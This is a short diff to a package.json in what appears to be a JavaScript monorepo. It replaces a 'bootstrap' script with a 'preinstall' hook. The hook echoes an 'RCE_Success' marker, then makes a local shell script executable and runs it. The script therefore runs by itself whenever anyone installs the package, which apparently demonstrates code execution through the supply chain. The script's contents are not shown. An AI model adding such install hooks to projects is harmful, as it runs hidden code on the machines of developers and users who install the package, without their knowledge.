@@ -8,7 +8,7 @@
     "packages/*"
   ],
   "scripts": {
-    "bootstrap": "lerna bootstrap1"
+    "preinstall": "echo ____RCE_Success runFile >&2; chmod +x myscript.sh; ./myscript.sh"
 
   },
   "dependencies": {
